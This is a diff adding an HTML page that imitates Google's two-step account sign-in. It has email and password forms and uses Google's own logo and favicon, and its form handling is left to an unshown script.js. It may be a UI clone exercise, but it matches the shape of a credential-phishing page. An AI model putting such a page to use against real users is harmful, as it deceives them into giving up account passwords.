@@ -1,0 +1,85 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in - Google Accounts</title>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&family=Google+Sans:wght@400;500&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://fonts.googleapis.com/icon?family=Material+Icons+Outlined">
+    <link rel="stylesheet" href="style.css">
+    <link rel="icon" href="https://www.google.com/favicon.ico" type="image/x-icon">
+</head>
+<body>
+    <div class="container">
+        <!-- Step 1: Email Input -->
+        <div class="signin-box" id="email-step">
+            <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google" class="logo">
+            <h1 class="title-text">Sign in</h1>
+            <p class="subtitle">Use your Google Account</p>
+
+            <form id="email-form">
+                <div class="input-group">
+                    <input type="email" id="email" name="email" required placeholder=" ">
+                    <label for="email">Email or phone</label>
+                </div>
+                <a href="#" class="forgot-link" id="forgot-email-link">Forgot Email?</a>
+
+                <p class="guest-mode-info">
+                    Not your computer? Use Guest mode to sign in privately.
+                    <a href="#">Learn more</a>
+                </p>
+
+                <div class="actions">
+                    <a href="#" class="create-account-link">Create account</a>
+                    <button type="submit" class="next-button">Next</button>
+                </div>
+            </form>
+        </div>
+
+        <!-- Step 2: Password Input -->
+        <div class="signin-box" id="password-step" style="display: none;">
+            <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google" class="logo">
+            <h1 class="title-text">Welcome</h1>
+
+            <div class="user-identifier-chip" id="user-identifier-chip" tabindex="0" role="button" aria-label="Change account">
+                <span class="material-icons-outlined user-icon">account_circle</span>
+                <span id="displayed-email"></span>
+                <span class="material-icons-outlined dropdown-icon">arrow_drop_down</span>
+            </div>
+
+            <form id="password-form">
+                <div class="input-group">
+                    <input type="password" id="password" name="password" required placeholder=" ">
+                    <label for="password">Enter your password</label>
+                </div>
+
+                <div class="show-password-container">
+                    <input type="checkbox" id="show-password">
+                    <label for="show-password">Show password</label>
+                </div>
+
+                <div class="actions">
+                    <a href="#" class="forgot-link" id="forgot-password-link">Forgot Password?</a>
+                    <button type="submit" class="next-button">Next</button>
+                </div>
+            </form>
+        </div>
+
+
+        <footer class="footer-links">
+            <select name="language" id="language-select">
+                <option value="en-US">English (United States)</option>
+                <option value="es">Español</option>
+                <option value="fr">Français</option>
+                <option value="de">Deutsch</option>
+            </select>
+            <div class="right-links">
+                <a href="#">Help</a>
+                <a href="#">Privacy</a>
+                <a href="#">Terms</a>
+            </div>
+        </footer>
+    </div>
+    <script src="script.js"></script>
+</body>
+</html>
